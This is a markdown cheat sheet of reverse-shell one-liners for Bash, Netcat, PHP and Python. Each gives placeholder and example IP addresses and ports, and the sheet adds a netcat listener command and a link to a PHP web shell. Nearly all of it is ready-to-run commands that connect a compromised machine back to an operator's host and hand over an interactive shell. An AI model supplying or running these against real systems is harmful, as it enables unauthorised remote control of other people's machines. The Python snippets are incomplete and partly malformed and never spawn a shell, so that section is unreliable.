# REVERSE SHELL 🐢

### Table of Contents 
   1. Bash 
   2. Netcat 
   3. PHP 
   4. Python 

## 1) Bash
```Bash_Bash
bash -i >& /dev/tcp/<IP_TO_CONNECT_TO>/<PORT> 0>&1

# Example:
  bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
+ Make sure to have `netcat` listening on local machine
 - `nc -nlvp PORT`
 - Example: `nc -nlvp 8080`

-----------------------------------------------------------------
### + + + + + + + + + + + + + + + + + + + + + + +
## 2) Netcat
+ Netcat is **rarely present on production systems**
 - _Even if it is_ there are _several versions_ of netcat that **don’t support the -e** option
```Basic_Netcat
nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
```Last_Ditch_Netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_TO_CONNECT_TO> <PORT> >/tmp/f

Example:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

-----------------------------------------------------------------
### + + + + + + + + + + + + + + + + + + + + + + +
## 3) PHP

```Basic_PHP
php -r '$sock=fsockopen("<IP_TO_CONNECT_TO>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Example:
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
+ This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

+ If you want a .php file to upload, see the more featureful and robust php-reverse-shell:
[More robust PHP Shell]: https://pentestmonkey.net/tools/web-shells/php-reverse-shell

-----------------------------------------------------------------
### + + + + + + + + + + + + + + + + + + + + + + +
## 4) PYTHON

```Tested_On_Python2_(swap_out_IP_and_Port)
# Command Line Version / Cmd Line Version
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))'

# Code Version
import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",1234))
```

-----------------------------------------------------------------
### + + + + + + + + + + + + + + + + + + + + + + +

